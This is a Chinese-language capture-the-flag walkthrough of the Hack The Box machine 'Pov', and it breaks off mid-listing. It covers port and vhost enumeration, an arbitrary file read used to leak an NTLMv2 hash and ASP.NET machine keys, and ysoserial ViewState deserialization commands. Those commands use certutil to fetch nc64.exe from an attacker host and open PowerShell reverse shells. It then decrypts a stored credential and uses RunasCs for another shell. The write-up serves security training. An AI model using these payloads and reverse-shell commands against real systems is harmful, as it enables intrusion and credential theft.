---
title: pov
pagination_prev: null
pagination_next: null
---

# 端口扫描

### 全端口扫描

~~~
┌──(kali㉿kali)-[~/pov]                                                            └─$ sudo nmap -sT -p- --min-rate 1000  10.10.11.251 -oA nmap/ports                 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 01:28 EST                 Nmap scan report for 10.10.11.251                                                  Host is up (0.078s latency).                                                       Not shown: 65534 filtered tcp ports (no-response)                                  PORT   STATE SERVICE                                                                                                                                                  80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 131.52 seconds

~~~

### 默认脚本扫描

~~~
┌──(kali㉿kali)-[~/pov]
└─$ sudo nmap -sT -sV -sC -O -p80   10.10.11.251 -oA nmap/sC
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 01:33 EST
Nmap scan report for 10.10.11.251
Host is up (0.088s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-title: pov.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.77 seconds

~~~

### 漏洞脚本扫描

~~~
┌──(kali㉿kali)-[~/pov]
└─$ sudo nmap -sT --script=vuln -p 80  10.10.11.251 -oA nmap/vuln
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 01:33 EST
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.251
Host is up (0.077s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-fileupload-exploiter: 
|   
|_    Couldn't find a file-type field.
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.

Nmap done: 1 IP address (1 host up) scanned in 954.31 seconds

~~~

### UDP扫描
~~~
┌──(kali㉿kali)-[~/pov]
└─$ sudo nmap -sU --top-ports 20 pov.htb -oA nmap/UDP 
[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-27 04:18 EST
Nmap scan report for pov.htb (10.10.11.251)
Host is up (0.085s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 3.13 seconds

~~~
# 目录爆破

~~~
┌──(kali㉿kali)-[~/pov]                                                                                                                                                                                                                 
└─$ sudo gobuster dir -u http://pov.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error                                                                                                                      
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://pov.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/img                  (Status: 301) [Size: 142] [--> http://pov.htb/img/]
/css                  (Status: 301) [Size: 142] [--> http://pov.htb/css/]
/js                   (Status: 301) [Size: 141] [--> http://pov.htb/js/]
/IMG                  (Status: 301) [Size: 142] [--> http://pov.htb/IMG/]
/*checkout*           (Status: 400) [Size: 3420]
/CSS                  (Status: 301) [Size: 142] [--> http://pov.htb/CSS/]
/Img                  (Status: 301) [Size: 142] [--> http://pov.htb/Img/]
/JS                   (Status: 301) [Size: 141] [--> http://pov.htb/JS/]
/*docroot*            (Status: 400) [Size: 3420]          
/*                    (Status: 400) [Size: 3420]          
/http%3A%2F%2Fwww     (Status: 400) [Size: 3420]          
/http%3A              (Status: 400) [Size: 3420]          
/q%26a                (Status: 400) [Size: 3420]          
/**http%3a            (Status: 400) [Size: 3420]          
/*http%3A             (Status: 400) [Size: 3420]          
/**http%3A            (Status: 400) [Size: 3420]          
/http%3A%2F%2Fyoutube (Status: 400) [Size: 3420]          
/http%3A%2F%2Fblogs   (Status: 400) [Size: 3420]          
/http%3A%2F%2Fblog    (Status: 400) [Size: 3420]          
/**http%3A%2F%2Fwww   (Status: 400) [Size: 3420]          
/s%26p                (Status: 400) [Size: 3420]          
/%3FRID%3D2671        (Status: 400) [Size: 3420]          
/devinmoore*          (Status: 400) [Size: 3420]          
/200109*              (Status: 400) [Size: 3420]          
/*sa_                 (Status: 400) [Size: 3420]          
/*dc_                 (Status: 400) [Size: 3420]          
/http%3A%2F%2Fcommunity (Status: 400) [Size: 3420]        
/Chamillionaire%20%26%20Paul%20Wall-%20Get%20Ya%20Mind%20Correct (Status: 400) [Size: 3420]                         
/Clinton%20Sparks%20%26%20Diddy%20-%20Dont%20Call%20It%20A%20Comeback%28RuZtY%29 (Status: 400) [Size: 3420]         
/DJ%20Haze%20%26%20The%20Game%20-%20New%20Blood%20Series%20Pt (Status: 400) [Size: 3420]                            
/http%3A%2F%2Fradar   (Status: 400) [Size: 3420]          
Progress: 200767 / 220561 (91.03%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 200783 / 220561 (91.03%)
===============================================================
Finished
===============================================================

~~~

~~~
┌──(kali㉿kali)-[~/pov] 03:30:11 [328/396]
└─$ sudo feroxbuster -u http://pov.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

___ ___ __ __ __ __ __ ___
|__ |__ |__) |__) | / ` / \ \_/ | | \ |__
| |___ | \ | \ | \__, \__/ / \ | |__/ |___

by Ben "epi" Risher 🤓 ver: 2.11.0

───────────────────────────┬──────────────────────

🎯 Target Url │ http://pov.htb

🚀 Threads │ 50

📖 Wordlist │ /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt

👌 Status Codes │ All Status Codes!

💥 Timeout (secs) │ 7

🦡 User-Agent │ feroxbuster/2.11.0

💉 Config File │ /etc/feroxbuster/ferox-config.toml

🔎 Extract Links │ true

🏁 HTTP methods │ [GET]

🔃 Recursion Depth │ 4

───────────────────────────┴──────────────────────

🏁 Press [ENTER] to use the Scan Management Menu™

──────────────────────────────────────────────────

404 GET 29l 95w 1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter

301 GET 2l 10w 142c http://pov.htb/img => http://pov.htb/img/

200 GET 6l 20w 1480c http://pov.htb/img/client-2.png

200 GET 23l 207w 11858c http://pov.htb/img/smart-protect-3.jpg

200 GET 3l 20w 1898c http://pov.htb/img/client-6.png

200 GET 19l 133w 11607c http://pov.htb/img/smart-protect-2.jpg

200 GET 3l 15w 1063c http://pov.htb/img/client-4.png

200 GET 22l 132w 13356c http://pov.htb/img/smart-protect-1.jpg

200 GET 8l 34w 2034c http://pov.htb/img/client-3.png

200 GET 14l 43w 2390c http://pov.htb/img/client-1.png

200 GET 2l 284w 14244c http://pov.htb/js/aos.js

200 GET 5l 26w 1732c http://pov.htb/img/client-5.png

200 GET 13l 55w 5918c http://pov.htb/img/logo.png

200 GET 162l 286w 2399c http://pov.htb/css/custom.css

200 GET 4l 10w 382c http://pov.htb/img/favicon.png

200 GET 2l 220w 25983c http://pov.htb/css/aos.css

200 GET 4l 66w 31000c http://pov.htb/font-awesome-4.7.0/css/font-awesome.min.css

200 GET 325l 1886w 151416c http://pov.htb/img/feature-2.png

200 GET 339l 1666w 139445c http://pov.htb/img/feature-1.png

200 GET 6l 1643w 150996c http://pov.htb/css/bootstrap.min.css

200 GET 234l 834w 12330c http://pov.htb/

403 GET 29l 92w 1233c http://pov.htb/font-awesome-4.7.0/css/

403 GET 29l 92w 1233c http://pov.htb/css/

403 GET 29l 92w 1233c http://pov.htb/font-awesome-4.7.0/

403 GET 29l 92w 1233c http://pov.htb/js/

301 GET 2l 10w 142c http://pov.htb/css => http://pov.htb/css/

301 GET 2l 10w 161c http://pov.htb/font-awesome-4.7.0/css => http://pov.htb/font-awesome-4.7.0/css/

301 GET 2l 10w 141c http://pov.htb/js => http://pov.htb/js/

301 GET 2l 10w 163c http://pov.htb/font-awesome-4.7.0/fonts => http://pov.htb/font-awesome-4.7.0/fonts/

404 GET 40l 156w 1885c http://pov.htb/%20

404 GET 40l 156w 1904c http://pov.htb/font-awesome-4.7.0/%20

404 GET 40l 156w 1889c http://pov.htb/img/%20

404 GET 40l 156w 1889c http://pov.htb/css/%20

404 GET 40l 156w 1908c http://pov.htb/font-awesome-4.7.0/css/%20
~~~



# 子域名枚举

dev似乎是可能的子域名，而且在主页最底部也提到了这个域名

~~~
┌──(kali㉿kali)-[~/pov]                                                            └─$ sudo gobuster vhost -u http://10.10.11.251 --domain pov.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain -k -r -t 100                                                           
===============================================================                                                                                                                                                                         
Gobuster v3.6                                                                                                                                                                                                                           
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)                                                                                                                                                                           
===============================================================                                                                                                                                                                         
[+] Url:             http://10.10.11.251                                                                                                                                                                                                
[+] Method:          GET                                                                                                                                                                                                                
[+] Threads:         100                                                                                                                                                                                                                
[+] Wordlist:        /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt                                                                                                                                      
[+] User Agent:      gobuster/3.6                                                                                                                                                                                                       
[+] Timeout:         10s                                                                                                                                                                                                                
[+] Append Domain:   true                                                                                                                                                                                                               
===============================================================                                                                                                                                                                         
Starting gobuster in VHOST enumeration mode                                                                                                                                                                                             
===============================================================                                                                                                                                                                         
Progress: 5877 / 114442 (5.14%)[ERROR] Get "http://dev.pov.htb/portfolio/": EOF                                                                                                                                                         
Found: xn--nckxa3g7cq2b5304djmxc-biz.pov.htb Status: 400 [Size: 334]                                                                                                                                                                    
Found: xn--cckcdp5nyc8g2837ahhi954c-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                  
Found: xn--7ck2d4a8083aybt3yv-com.pov.htb Status: 400 [Size: 334]                                                                                                                                                                       
Found: xn--u9jxfma8gra4a5989bhzh976brkn72bo46f-com.pov.htb Status: 400 [Size: 334]                                                                                                                                                      
Found: xn--y8jvc027l5cav97szrms90clsb-com.pov.htb Status: 400 [Size: 334]                                                                                                                                                               
Found: xn--t8j3b111p8cgqtb3v9a8tm35k-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                 
Found: xn--new-h93bucszlkray7gqe-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                     
Found: xn--2-uc7a56k9z0ag5f2zfgq0d-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                   
Found: xn--68j4bva0f0871b88tc-com.pov.htb Status: 400 [Size: 334]                                                                                                                                                                       
Found: xn--68jza6c5o5cqhlgz994b-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                      
Found: xn--zck3adi4kpbxc7d2131c5g2au9css5o-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                           
Found: xn--u9j5h1btf1e9236atkap9eil-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                  
Found: xn--u9j5h1btf1en15qnfb9z6hxg3a-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                
Found: xn--54qq0q0en86ikgxilmjza-biz.pov.htb Status: 400 [Size: 334]                                                                                                                                                                    
Found: xn--qckr4fj9ii2a7e-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                            
Found: xn--u9j5h1btf1eo45u111ac9hf95c-com.pov.htb Status: 400 [Size: 334]                                                                                                                                                               
Found: xn--fdkc8h2az097bv1wbh4e-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                      
Found: xn--yckvb0d4245c-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                                              
Found: xn--39ja4cb4nqb6d4fu546bkkucpl7d-jp.pov.htb Status: 400 [Size: 334]                                                                                                                                                              
Found: xn--u9j0goar6iyfrb7809ddyvakw0e2vh-biz.pov.htb Status: 400 [Size: 334]                                                                                                                                                           
Found: xn--nckuad2au4azb6dvd8fna2594hb0sc-biz.pov.htb Status: 400 [Size: 334]                                                                                                                                                           
Found: xn--eckm3b6d2a9b3gua9f2d6658ehctafoz-jp.pov.htb Status: 400 [Size: 334] ****
~~~

![](Pasted%20image%2020241127174807.png)

# dev.pov.htb

看起来是一个个人的简介，还可以下载他的简历

![](Pasted%20image%2020241127180224.png)

![](Pasted%20image%2020241127180316.png)

做一下简单的目录爆破

~~~
┌──(kali㉿kali)-[~/pov]
└─$ sudo gobuster dir -u http://dev.pov.htb/portfolio/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt --no-error                                                                                                                           
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.pov.htb/portfolio/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/assets/]
/%20                  (Status: 302) [Size: 156] [--> /default.aspx?aspxerrorpath=/portfolio/]
/Assets               (Status: 301) [Size: 159] [--> http://dev.pov.htb/portfolio/Assets/]
/*checkout*           (Status: 302) [Size: 166] [--> /default.aspx?aspxerrorpath=/portfolio/*checkout*]
/*docroot*            (Status: 302) [Size: 165] [--> /default.aspx?aspxerrorpath=/portfolio/*docroot*]
/*                    (Status: 302) [Size: 157] [--> /default.aspx?aspxerrorpath=/portfolio/*]
/con                  (Status: 302) [Size: 159] [--> /default.aspx?aspxerrorpath=/portfolio/con]
/http%3A%2F%2Fwww     (Status: 302) [Size: 179] [--> /default.aspx?aspxerrorpath=/portfolio/http:/www]
/http%3A              (Status: 302) [Size: 173] [--> /default.aspx?aspxerrorpath=/portfolio/http:]
/q%26a                (Status: 302) [Size: 163] [--> /default.aspx?aspxerrorpath=/portfolio/q&a]
/**http%3a            (Status: 302) [Size: 175] [--> /default.aspx?aspxerrorpath=/portfolio/**http:]
/*http%3A             (Status: 302) [Size: 174] [--> /default.aspx?aspxerrorpath=/portfolio/*http:]
Progress: 47421 / 220561 (21.50%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 47445 / 220561 (21.51%)
===============================================================
Finished
===============================================================

~~~

顺便搜集一下出现过的人名

~~~
Stephen Fitz
James Bert
Emma Re
Michael Abra
~~~

下载简历的时候抓一下包

![](Pasted%20image%2020241127191125.png)

试试可不可以修改file参数
成功！，我们可以进行任意文件读取

![](Pasted%20image%2020241127191217.png)

试一下读smb共享

![](Pasted%20image%2020241127194817.png)

收到反应

~~~
┌──(kali㉿kali)-[~/Desktop]
└─$ ./impacket-smbserver share .  -smb2support 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.11.251,49680)
[*] AUTHENTICATE_MESSAGE (POV\sfitz,POV)
[*] User POV\sfitz authenticated successfully
[*] sfitz::POV:aaaaaaaaaaaaaaaa:24ed458fd7a3f95460854e2dca02eaa3:010100000000000080d6bf8bc240db01047c0d60ec7ede9400000000010010006a004e006c006800690053006c007000030010006a004e006c006800690053006c00700002001000570048007500640055004e0061004e0004001000570048007500640055004e0061004e000700080080d6bf8bc240db01060004000200000008003000300000000000000000000000002000007f7f0cc2bf3c0616afa09089aabe1da7e4978be2978b05994101565167fbf26f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310039000000000000000000
[*] Closing down connection (10.10.11.251,49680)
[*] Remaining connections []

~~~

hashcat破解一下
没破解出来

~~~
┌──(kali㉿kali)-[~/pov]
└─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt  --potfile-disable
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu-sandybridge-11th Gen Intel(R) Core(TM) i5-11400H @ 2.70GHz, 2999/6063 MB (1024 MB allocatable), 6MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

Session..........: hashcat                                
Status...........: Exhausted
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SFITZ::POV:aaaaaaaaaaaaaaaa:24ed458fd7a3f95460854e2...000000
Time.Started.....: Wed Nov 27 06:52:17 2024 (13 secs)
Time.Estimated...: Wed Nov 27 06:52:30 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1119.6 kH/s (0.86ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 14344385/14344385 (100.00%)
Rejected.........: 0/14344385 (0.00%)
Restore.Point....: 14344385/14344385 (100.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $HEX[212173657879616e67656c2121] -> $HEX[042a0337c2a156616d6f732103]
Hardware.Mon.#1..: Util: 55%

Started: Wed Nov 27 06:52:16 2024
Stopped: Wed Nov 27 06:52:32 2024

~~~

尝试读取配置文件

![](Pasted%20image%2020241127205621.png)

看了wp才知道viewstate是一个序列化后的对象，我们这里已经拿到了解密的密钥，可以进行反序列化注入

~~~
PS C:\Users\lizis\Desktop\tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "ping 10.10.16.19" --path="/portfolio"  --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
22kFZ48cRWOHwSAFNcGlU8dRlqIRGHH%2F9wzoMfklet0hG7GHH7xA6Xpq%2BCHCSzM3zv%2FMzPHDwQWkOtmVLYc0PDoEnJJKXQk5f5sOoVY2xQhm4K6lvaYNQSAf5Fb7QWtC3CGgylpMPxa8zkeCu6HOEHcDh%2FLsvBfvdtrWpc%2BFKb8sf%2BP71DJ9aFmpc34GQKSH9SmZjYK1Zdbk7gJ45jedUcUi6t9K2uDoY7Z8mcfBIbXjsp996FW97YNW0pCPWHvkgWSYDkGyAK%2FXK02f6VClotMV0EU2A1u8qFFV7%2Fm3thJ2UuWdld7j9Mvem%2F%2B9diQOnnNPhGlZXK9o0peT6RsyWw7S39h4rXNmAwofpYwBKZiOXQcFqm1jKZXPKxoMYKF78COwlk94CmQQJQc%2Fmytfb6qNIGbj%2B3GfawAQmCM9RDgVFSTKCLcrSlT8s7dxbnZIPlwt8uOTAkQo%2Bxb6PSSx8lmg1%2F5%2B85Efn30ZBS2Tkv3jlF80Y7F%2F7SiQtpyDVD9cmsFJHrQoqgDNHQ5pB5oBW0MoMUEFA3Fr4yWRGUpy6UJVjZ5Q65ziMfhKkJCxrjWLenYeHzDfRdO1Z735Tc3PxpY802w38Ey872jpyfhlb0Y2TIwZaJLviN3UU%2FENFJDE1u2fGOBBFroA6O%2B2B%2BhB%2BHjC9aIG8kbqukhblvBQhIzc3qh%2Fp%2BkfYtejea7Og2pSuG7t9%2B1NPfV7qYJX%2FpHskFG8QzDXzdM7cGf0cX2zzz1etqHP%2Fg4%2BSpPCSHtn0oMy1WauOrVRJEVvlumxwGGHU6ZjwSBzfSn7atMT0jiDeJiLQbeqhdqh0%2B%2FAB%2FuvWUHZiruuw9bTuPy01CXdYrS%2BSNM0510fYLcawm2BeHR2wHcbe71Spi8taVAO2mEMIPyLMGneIu%2BkH6zqr7CWnWUB7TAeoX658ckitOJMfxSlMJtqVOMonA9%2B3AUAcO3ISne1HPMU7aprlUlwRB7DL276AOHQA0ZcZEWedFT77nV%2F6UJAWdsPL9YfuazGI32IRMErpZApBoxHPuR1TM0kv2blPnKpkPo%2BWUkjrVlAxO5oc2pUsm0BNoIanVHxPeEDO1zGukcqfjLNVntf13SbPDvDhyFih8uctpORSz0Ea57k6lJE%2BmYlDsqIU1OsXy6a%2F%2FBZD1q61JLsYQ2TNjTNVL5UzF4bXB3EUMH2aCDcgAz2%2FdbP%2BXM49Ek158HqEANjooBY9GqqE7YhEF91H0rHG%2Bsll%2FOzABmycKsnPkCJn9QWExzdntUqIVcJR0oJD3%2FqRdG6gAFivzl0%2F1zF308vm8V%2Ftk82bqo%3D
~~~

在tshark中捕获到icmp包

~~~
┌──(kali㉿kali)-[~/pov]
└─$ tshark -i tun0 -p icmp
 ** (tshark:1397719) 01:39:29.346478 [WSUtil WARNING] ./wsutil/filter_files.c:242 -- read_filter_list(): '/usr/share/wireshark/cfilters' line 1 doesn't have a quoted filter name.
 ** (tshark:1397719) 01:39:29.346883 [WSUtil WARNING] ./wsutil/filter_files.c:242 -- read_filter_list(): '/usr/share/wireshark/cfilters' line 2 doesn't have a quoted filter name.
Capturing on 'tun0'
    1 0.000000000 10.10.11.251 → 10.10.16.19  ICMP 60 Echo (ping) request  id=0x0001, seq=9/2304, ttl=127
    2 0.000019699  10.10.16.19 → 10.10.11.251 ICMP 60 Echo (ping) reply    id=0x0001, seq=9/2304, ttl=64 (request in 1)
    3 1.014020903 10.10.11.251 → 10.10.16.19  ICMP 60 Echo (ping) request  id=0x0001, seq=10/2560, ttl=127
    4 1.014047303  10.10.16.19 → 10.10.11.251 ICMP 60 Echo (ping) reply    id=0x0001, seq=10/2560, ttl=64 (request in 3)
    5 2.029287753 10.10.11.251 → 10.10.16.19  ICMP 60 Echo (ping) request  id=0x0001, seq=11/2816, ttl=127
    6 2.029330253  10.10.16.19 → 10.10.11.251 ICMP 60 Echo (ping) reply    id=0x0001, seq=11/2816, ttl=64 (request in 5)
    7 3.047079942 10.10.11.251 → 10.10.16.19  ICMP 60 Echo (ping) request  id=0x0001, seq=12/3072, ttl=127
    8 3.047144042  10.10.16.19 → 10.10.11.251 ICMP 60 Echo (ping) reply    id=0x0001, seq=12/3072, ttl=64 (request in 7)
~~~

执行命令下载nc64.exe

~~~
PS C:\Users\lizis\Desktop\tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio"  --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "certutil.exe -urlcache -f -split http://10.10.16.19:80/nc64.exe c:\programdata\nc64.exe"
~~~

收到反应

~~~
┌──(kali㉿kali)-[~/Desktop]
└─$ php -S 0:80
[Thu Nov 28 02:10:39 2024] PHP 8.2.24 Development Server (http://0:80) started
[Thu Nov 28 02:10:48 2024] 10.10.11.251:49688 Accepted
[Thu Nov 28 02:10:48 2024] 10.10.11.251:49688 [200]: GET /nc64.exe
[Thu Nov 28 02:10:48 2024] 10.10.11.251:49688 Closing
[Thu Nov 28 02:10:48 2024] 10.10.11.251:49689 Accepted
[Thu Nov 28 02:10:49 2024] 10.10.11.251:49689 [200]: GET /nc64.exe
[Thu Nov 28 02:10:49 2024] 10.10.11.251:49689 Closing
[Thu Nov 28 02:10:51 2024] 10.10.11.251:49687 Accepted
[Thu Nov 28 02:10:51 2024] 10.10.11.251:49687 [200]: GET /nc64.exe


~~~

反弹shell

~~~
PS C:\Users\lizis\Desktop\tools\ysoserial-1dba9c4416ba6e79b6b262b758fa75e2ee9008e9\Release> .\ysoserial.exe -p ViewState -g TextFormattingRunProperties --path="/portfolio"  --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" -c "c:\programdata\nc64.exe -e powershell.exe 10.10.16.19 443"
~~~

拿到立足点

~~~
┌──(kali㉿kali)-[~/pov]
└─$ sudo rlwrap nc -lvnp 443 
[sudo] password for kali: 
listening on [any] 443 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.251] 49690
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv> 

~~~

# 提权

找了一圈userflag没找到

先看一下还有哪些用户

alaading值得关注

~~~
PS C:\users\sfitz\Documents> net user
net user

User accounts for \\POV

-------------------------------------------------------------------------------
Administrator            alaading                 DefaultAccount           
Guest                    sfitz                    WDAGUtilityAccount       
The command completed successfully.

~~~

在用户的家目录下找到了connection.xml
里面似乎是一组凭证

~~~
PS C:\users\sfitz\Documents> ls
ls


    Directory: C:\users\sfitz\Documents


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----       12/25/2023   2:26 PM           1838 connection.xml                                                        


PS C:\users\sfitz\Documents> type connection.xml
type connection.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>

~~~

解密

~~~
PS C:\windows\system32\inetsrv> $importedObject = Import-Clixml -Path "C:\Users\sfitz\Documents\connection.xml"
$importedObject = Import-Clixml -Path "C:\Users\sfitz\Documents\connection.xml"
PS C:\windows\system32\inetsrv> $importedObject
$importedObject

UserName                     Password
--------                     --------
alaading System.Security.SecureString

PS C:\programdata> $importedObject.getnetworkcredential().Password
$importedObject.getnetworkcredential().Password
f8gQ8fynP44ek1m3

~~~

用RunasCs重新弹一个alaading的shell回去

~~~
PS C:\programdata> ./RunasCs.exe alaading 'f8gQ8fynP44ek1m3' powershell -r 10.10.16.19:4444 -t 0
./RunasCs.exe alaading 'f8gQ8fynP44ek1m3' powershell -r 10.10.16.19:4444 -t 0                                               

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-4d5556$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 4056 created in background.

~~~

拿到userflag

~~~
PS C:\Users\alaading\Desktop> ls
ls


    Directory: C:\Users\alaading\Desktop


Mode                LastWriteTime         Length Name                                                                  
